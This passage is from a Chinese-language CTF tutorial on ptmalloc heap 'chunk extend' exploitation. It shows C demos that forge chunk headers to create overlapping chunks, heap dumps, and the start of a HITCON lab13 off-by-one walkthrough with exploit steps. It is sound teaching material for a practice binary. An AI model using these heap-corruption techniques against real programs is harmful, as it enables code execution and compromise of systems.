\u7684\u6548\u679c\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u65f6\u673a\u548c\u6761\u4ef6\uff1a \u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e \u539f\u7406 \u00b6 chunk extend \u6280\u672f\u80fd\u591f\u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e ptmalloc \u5728\u5bf9\u5806 chunk \u8fdb\u884c\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684\u5404\u79cd\u5b8f\u3002 \u5728 ptmalloc \u4e2d\uff0c**\u83b7\u53d6 chunk \u5757\u5927\u5c0f**\u7684\u64cd\u4f5c\u5982\u4e0b /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002 \u5728 ptmalloc \u4e2d\uff0c**\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740**\u7684\u64cd\u4f5c\u5982\u4e0b /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002 \u5728 ptmalloc \u4e2d\uff0c**\u83b7\u53d6\u524d\u4e00\u4e2a chunk \u4fe1\u606f**\u7684\u64cd\u4f5c\u5982\u4e0b /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5373\u901a\u8fc7 malloc_chunk->prev_size \u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002 \u5728 ptmalloc\uff0c**\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662f use \u72b6\u6001**\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a #define inuse(p) (((( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size ) & PREV_INUSE ) \u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002 \u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1 \u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784 \u4e00\u8282\u3002 \u901a\u8fc7\u4e0a\u9762\u51e0\u4e2a\u5b8f\u53ef\u4ee5\u770b\u51fa\uff0c ptmalloc \u901a\u8fc7 chunk header \u7684\u6570\u636e\u5224\u65ad chunk \u7684\u4f7f\u7528\u60c5\u51b5\u548c\u5bf9 chunk \u7684\u524d\u540e\u5757\u8fdb\u884c\u5b9a\u4f4d \u3002\u7b80\u800c\u8a00\u4e4b\uff0c chunk extend \u5c31\u662f\u901a\u8fc7\u63a7\u5236 size \u548c pre_size \u57df\u6765\u5b9e\u73b0\u8de8\u8d8a\u5757\u64cd\u4f5c\u4ece\u800c\u5bfc\u81f4 overlapping \u7684 \u3002 \u4e0e chunk extend \u7c7b\u4f3c\u7684\u8fd8\u6709\u4e00\u79cd\u79f0\u4e3a chunk shrink \u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u53ea\u4ecb\u7ecd chunk extend \u7684\u5229\u7528\u3002 \u4ee5\u4e0b\u793a\u4f8b\u4ee3\u7801\uff0c\u8c28\u614e\u52a0\u5165 printf \u7b49\u51fd\u6570\uff0c\u56e0\u4e3a\u7a0b\u5e8f\u6ca1\u6709\u521d\u59cb\u5316\u7f13\u51b2\u533a\uff0c\u5982\u679c\u5f15\u5165\u8fd9\u4e9b\u51fd\u6570\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a\u5806\u7528\u4f5c\u7f13\u5b58 \u57fa\u672c\u793a\u4f8b 1\uff1a\u5bf9 inuse \u7684 fastbin \u8fdb\u884c extend \u00b6 \u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u5728 64 \u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u5728 32 \u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a 8 \u5b57\u8282\u504f\u79fb\u6539\u4e3a 4 \u5b57\u8282 \u3002 int main ( void ) { void * ptr , * ptr1 ; ptr = malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk * ( long long * )(( long long ) ptr -0x8 ) = 0x41 ; // \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df free ( ptr ); ptr1 = malloc ( 0x30 ); // \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9 return 0 ; } \u5f53\u4e24\u4e2a malloc \u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000021 < === chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 < === chunk 2 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 < === top chunk \u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a 0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002 0x602000: 0x0000000000000000 0x0000000000000041 < === \u7be1\u6539\u5927\u5c0f 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 \u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002 Fastbins [ idx = 0 , size = 0x10 ] 0x00 Fastbins [ idx = 1 , size = 0x20 ] 0x00 Fastbins [ idx = 2 , size = 0x30 ] \u2190 Chunk ( addr = 0x602010, size = 0x40, flags = PREV_INUSE ) Fastbins [ idx = 3 , size = 0x40 ] 0x00 Fastbins [ idx = 4 , size = 0x50 ] 0x00 Fastbins [ idx = 5 , size = 0x60 ] 0x00 Fastbins [ idx = 6 , size = 0x70 ] 0x00 \u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002 call 0x400450 < malloc @ plt > mov QWORD PTR [ rbp -0x8 ], rax rax = 0x602010 \u6ce8\u89e3 \u00b6 \u56e0\u4e3a fastbin \u8ffd\u6c42\u6548\u7387\uff0c\u5b89\u5168\u6821\u9a8c\u673a\u5236\u5f31\uff0cfree \u65f6\u627e\u5230 fastbin \u94fe\u8868\u4e2d\u5bf9\u5e94\u5927\u5c0f\u94fe\u8868\u5c31\u653e\u5165\u4e86\u3002prev_inuse \u7b49\u4e0d\u4f1a\u6821\u9a8c\u3002\u7269\u7406\u5730\u5740\u76f8\u90bb\u7684\u7a7a\u95f2 fastbin \u4e0d\u4f1a\u5408\u5e76\u3002 1 \u57fa\u672c\u793a\u4f8b 2\uff1a\u5bf9 inuse \u7684 smallbin \u8fdb\u884c extend \u00b6 \u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8e unsorted bin \u94fe\u8868\u4e2d\u3002 \u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 \u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f 0x70\uff09 int main () { void * ptr , * ptr1 ; ptr = malloc ( 0x80 ); //\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1 malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2 malloc ( 0x10 ); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76\u7684chunk3 * ( int * )(( int ) ptr -0x8 ) = 0xb1 ; free ( ptr ); ptr1 = malloc ( 0xa0 ); } \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548c top chunk \u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2a chunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0e top chunk \u9694\u5f00\u3002 0x602000: 0x0000000000000000 0x00000000000000b1 <===chunk1 \u7be1\u6539size\u57df 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000021 <=== \u9632\u6b62\u5408\u5e76\u7684chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk \u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165 unsorted bin \uff0cchunk3 prev_size \u5199\u5165 0xb0 \uff0cprev_inuse \u4e3a 0 \uff1a 0x602000: 0x0000000000000000 0x00000000000000b1 <=== \u88ab\u653e\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x00000000000000b0 0x0000000000000020 <=== \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) \u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9 0x4005b0 <main+74> call 0x400450 <malloc@plt> \u2192 0x4005b5 <main+79> mov QWORD PTR [ rbp-0x8 ] , rax rax : 0x0000000000602010 \u57fa\u672c\u793a\u4f8b 3\uff1a\u5bf9 free \u7684 smallbin \u8fdb\u884c extend \u00b6 \u793a\u4f8b 3 \u662f\u5728\u793a\u4f8b 2 \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684 size \u57df\u3002 int main () { void * ptr , * ptr1 ; ptr = malloc ( 0x80 ); //\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1 malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2 free ( ptr ); //\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin * ( int * )(( int ) ptr -0x8 ) = 0xb1 ; ptr1 = malloc ( 0xa0 ); } \u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000091 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6211\u4eec\u9996\u5148\u91ca\u653e chunk1 \u4f7f\u5b83\u8fdb\u5165 unsorted bin \u4e2d unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) 0x602000: 0x0000000000000000 0x0000000000000091 <=== \u8fdb\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <=== top chunk \u7136\u540e\u7be1\u6539 chunk1 \u7684 size \u57df 0x602000: 0x0000000000000000 0x00000000000000b1 <=== size\u57df\u88ab\u7be1\u6539 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86 chunk2 \u7684\u5185\u5bb9\u3002 2 Chunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48 \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f**\u53ef\u4ee5\u63a7\u5236 chunk \u4e2d\u7684\u5185\u5bb9**\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002 \u6b64\u5916**\u901a\u8fc7 extend \u53ef\u4ee5\u5b9e\u73b0 chunk overlapping\uff0c\u901a\u8fc7 overlapping \u53ef\u4ee5\u63a7\u5236 chunk \u7684 fd/bk \u6307\u9488\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528**\u3002 \u57fa\u672c\u793a\u4f8b 4\uff1a\u901a\u8fc7 extend \u540e\u5411 overlapping \u00b6 \u8fd9\u91cc\u5c55\u793a\u901a\u8fc7 extend \u8fdb\u884c\u540e\u5411 overlapping\uff0c\u8fd9\u4e5f\u662f\u5728 CTF \u4e2d\u6700\u5e38\u51fa\u73b0\u7684\u60c5\u51b5\uff0c\u901a\u8fc7 overlapping \u53ef\u4ee5\u5b9e\u73b0\u5176\u5b83\u7684\u4e00\u4e9b\u5229\u7528\u3002 int main () { void * ptr , * ptr1 ; ptr = malloc ( 0x10 ); //\u5206\u914d\u7b2c1\u4e2a 0x80 \u7684chunk1 malloc ( 0x10 ); //\u5206\u914d\u7b2c2\u4e2a 0x10 \u7684chunk2 malloc ( 0x10 ); //\u5206\u914d\u7b2c3\u4e2a 0x10 \u7684chunk3 malloc ( 0x10 ); //\u5206\u914d\u7b2c4\u4e2a 0x10 \u7684chunk4 * ( int * )(( int ) ptr -0x8 ) = 0x61 ; free ( ptr ); ptr1 = malloc ( 0x50 ); } \u521d\u59cb\u5316\u5206\u914d 4 \u4e2a\u5806\u4e4b\u540e\uff1a \u5c06\u7b2c\u4e00\u4e2a chunk size \u4fee\u6539\u4e3a 0x61 \uff0c\u7136\u540e free \u7b2c\u4e00\u4e2a\u5806\u5757\uff0c\u7ea2\u6846\u5185\u7684\u90fd\u4f1a\u88ab\u5f53\u505a\u4e00\u4e2a\u6574\u4f53\u653e\u5165\u5230 fastbin \u5f53\u4e2d\uff1a \u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d\u5927\u5c0f\u4e3a 0x50 \uff08\u4e0d\u542bchunk header\uff09\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u5757\u5185\u5b58\u4e86\uff1a \u5728 malloc(0x50) \u5bf9 extend \u533a\u57df\u91cd\u65b0\u5360\u4f4d\u540e\uff0c\u5176\u4e2d 0x10 \u7684 fastbin \u5757\u4f9d\u7136\u53ef\u4ee5\u6b63\u5e38\u7684\u5206\u914d\u548c\u91ca\u653e\uff0c\u6b64\u65f6\u5df2\u7ecf\u6784\u6210 overlapping\uff0c\u901a\u8fc7\u5bf9 overlapping \u7684\u8fdb\u884c\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack\u3002 \u57fa\u672c\u793a\u4f8b 5\uff1a\u901a\u8fc7 extend \u524d\u5411 overlapping \u00b6 \u8fd9\u91cc\u5c55\u793a\u901a\u8fc7\u4fee\u6539 pre_inuse \u57df\u548c pre_size \u57df\u5b9e\u73b0\u5408\u5e76\u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u7684\u5757 int main ( void ) { void * ptr1 , * ptr2 , * ptr3 , * ptr4 ; ptr1 = malloc ( 128 ); //smallbin1 ptr2 = malloc ( 0x10 ); //fastbin1 ptr3 = malloc ( 0x10 ); //fastbin2 ptr4 = malloc ( 128 ); //smallbin2 malloc ( 0x10 ); //\u9632\u6b62\u4e0etop\u5408\u5e76 free ( ptr1 ); * ( int * )(( long long ) ptr4 -0x8 ) = 0x90 ; //\u4fee\u6539pre_inuse\u57df\uff0cprev_inuse * ( int * )(( long long ) ptr4 -0x10 ) = 0xd0 ; //\u4fee\u6539pre_size\u57df\uff0cprev_size free ( ptr4 ); //unlink\u8fdb\u884c\u524d\u5411extend malloc ( 0x150 ); //\u5360\u4f4d\u5757 } \u8fd9\u91cc\u4f8b\u5b50\u8c03\u8bd5\u4e00\u76f4\u51fa\u4e0d\u6765\u5806\u4fe1\u606f\uff0c\u5c31\u6587\u5b57\u63cf\u8ff0\u4e00\u4e0b\uff1a\uff08\u5927\u4f6c\u7b14\u8bb0\uff1a https://bbs.pediy.com/thread-260316.htm \uff09 \u5148\u5e03\u7f6e\u597d 5 \u4e2a\u5806\u5757\uff0c\u7136\u540e\u91ca\u653e ptr1 \u8fdb\u5165\u5230 unsortedbin \u3002 \u4fee\u6539 ptr4 \u7684 prev_inuse \u4e3a 0 \u6807\u8bb0\u524d\u4e00\u4e2a\u5806\u5757\u91ca\u653e\uff08\u7a7a\u95f2\uff09\uff0c\u7ed5\u8fc7 next_chunk inuse \u68c0\u67e5\u3002 \u4fee\u6539 ptr4 \u7684 prev_size \u4e3a ptr1+ptr2+ptr3 \uff0c\u7ed5\u8fc7 next_chunk size == chunk size \u68c0\u67e5\u3002 \u91ca\u653e ptr4 \u4f1a\u89e6\u53d1\u56de\u6536\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u5408\u5e76\u7269\u7406\u76f8\u90bb\u7684\u5806\uff0c\u7528\u5230\u7684\u64cd\u4f5c\u662f unlink \uff0c\u5c31\u5c06 ptr1~4 \u5f53\u505a\u4e00\u4e2a\u5806\u5757\u653e\u5165 unsortedbin\u3002 \u524d\u5411 extend \u5229\u7528\u4e86 smallbin \u7684 unlink \u673a\u5236\uff0c\u901a\u8fc7\u4fee\u6539 pre_size \u57df\u53ef\u4ee5\u8de8\u8d8a\u591a\u4e2a chunk \u8fdb\u884c\u5408\u5e76\u5b9e\u73b0 overlapping\u3002 HITCON Trainging lab13 \u00b6 \u9898\u76ee\u94fe\u63a5 \u57fa\u672c\u4fe1\u606f \u00b6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\uff0c\u8fd8\u6709\u4e00\u70b9\u5c31\u662f RELRO: Partial RELRO GOT \u8868\u53ef\u4ee5\u4fee\u6539\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002 \u6bcf\u4e2a content \u5806\u5757\u7528\u4e00\u4e2a 0x10 \u7684\u7ed3\u6784\u4f53\u5806\u53bb\u7ef4\u62a4\uff0c\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a struct chunk { size_t size ; //context \u5927\u5c0f _QWORD * chunk ; //context \u6307\u9488 } \u6f0f\u6d1e\u51fd\u6570 \u00b6 edit \u3001 show \u529f\u80fd\u90fd\u5b58\u5728 off-by-one \uff0c\u4e24\u8005\u51fa\u73b0\u903b\u8f91\u3001\u5730\u65b9\u4e00\u81f4\uff0c\u9020\u6210\u5f71\u54cd\u7684 edit \uff0c\u8fd9\u91cc\u5c31\u4ee5 edit \u53d9\u8ff0\u3002 \u53ef\u4ee5\u770b\u5230 19 \u884c\u5199\u5165\u6570\u636e\u7684\u65f6\u5019\u4f20\u5165\u7684\u957f\u5ea6\u53c2\u6570\u88ab\u6545\u610f\u52a0 1 \u4e86\uff0c\u9020\u6210\u6ea2\u51fa\u53ef\u63a7\u7684\u4e00\u5b57\u8282\u3002 \u601d\u8def \u00b6 \u5229\u7528 off-by-one \u8986\u76d6\u4e0b\u4e00\u4e2a chunk \u7684 size \uff08\u8fd9\u91cc\u4fee\u6539\u7684\u662f\u7ed3\u6784\u4f53 chunk \uff09\uff0c\u4f2a\u9020 chunk \u5927\u5c0f \u91ca\u653e\u88ab\u6ea2\u51fa chunk \u540e\uff0c\u7533\u8bf7\u4f2a\u9020 chunk \uff0c\u9020\u6210 chunk overlap\uff08\u5806\u91cd\u53e0\uff09\uff0c\u4ece\u800c\u63a7\u5236\u65b0\u7ed3\u6784\u4f53\u7684\u6307\u9488\u3002 \u5148\u5e03\u7f6e\u597d\u5185\u5b58\u7a7a\u95f4\uff1a create ( 0x18 , 'a' * 0x10 ) #0 create ( 0x10 , 'b' * 0x10 ) #1 chunk0 content \u5927\u5c0f\u8981\u6c42\u662f\u7528\u5230\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u7528\u4e8e\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2a chunk \u7684 size \u3002 chunk1 content \u5927\u5c0f\u6700\u597d\u662f 0x10 \uff0c\u8fd9\u6837\u6211\u4eec\u6ea2\u51fa\u4fee\u6539\u3001\u91ca\u653e chunk1 \u540e\u518d\u7533\u8bf7\u4e00\u4e2a chunk \u7ed3\u6784\u4f53\u5c31\u4f1a\u7528\u8fd9\u4e2a chunk1 content \u7a7a\u95f4\uff08\u4e3a\u4ec0\u4e48\u4e0d\u7528\u539f\u6765\u7684\uff1f \u5c0f\u7ed3 \uff09\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u5176\u4ed6\u5927\u5c0f\uff0c\u81ea\u884c\u8c03\u8bd5\u5373\u53ef\u3002\u8fd9\u91cc\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff1achunk1 content size 0x30 \uff0c\u6ea2\u51fa\u4fee\u6539\u7ed3\u6784\u4f53 size \u4e3a\uff1a0x71 \u3002 \u5806\u7ed3\u6784\u5982\u4e0b\uff1a pwndbg> x /20gx 0xac4000 0xac4000: 0x0000000000000000 0x0000000000000021 0xac4010: 0x0000000000000018 0x0000000000ac4030 0xac4020: 0x0000000000000000 0x0000000000000021 0xac4030: 0x6161616161616161 0x6161616161616161 0xac4040: 0x0000000000000000 0x0000000000000021 0xac4050: 0x0000000000000010 0x0000000000ac4070 0xac4060: 0x0000000000000000 0x0000000000000021 0xac4070: 0x6262626262626262 0x6262626262626262 0xac4080: 0x0000000000000000 0x0000000000020f81 0xac4090: 0x0000000000000000 0x0000000000000000 \u7136\u540e\u4fee\u6539 chunk0 \u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2a chunk size\uff0c\u8fd9\u91cc\u628a /bin/sh\\x00 \u4e5f\u4e00\u8d77\u5199\u5165\uff1a edit ( 0 , \"/bin/sh \\x00 \" . ljust ( 0x18 , 'a' ) + \" \\x41 \" ) \u4fee\u6539\u540e chunk1 \u7ed3\u6784\u4f53\u5c31\u5c06 chunk1 content \u4e5f\u5305\u542b\u8fdb\u6765\u4e86\uff0c\u91ca\u653e\u7684\u65f6\u5019\u4f1a\u653e\u5165 0x40 \u7684 fastbin \u4e2d\u3002 \u5806\u7ed3\u6784\u5982\u4e0b\uff1a pwndbg> x /20gx 0xac4000 0xac4000: 0x0000000000000000 0x0000000000000021 0xac4010: 0x0000000000000018 0x0000000000ac4030 0xac4020: 0x0000000000000000 0x0000000000000021 0xac4030: 0x0068732f6e69622f 0x6161616161616161 0xac4040: 0x6161616161616161 0x0000000000000041 //chunk1 struct 0xac4050: 0x0000000000000010 0x0000000000ac4070 0xac4060: 0x0000000000000000 0x0000000000000021 //chunk1 content 0xac4070: 0x6262626262626262 0x6262626262626262 0xac4080: 0x0000000000000000 0x0000000000020f81 0xac4090: 0x0000000000000000 0x0000000000000000 \u91ca\u653e 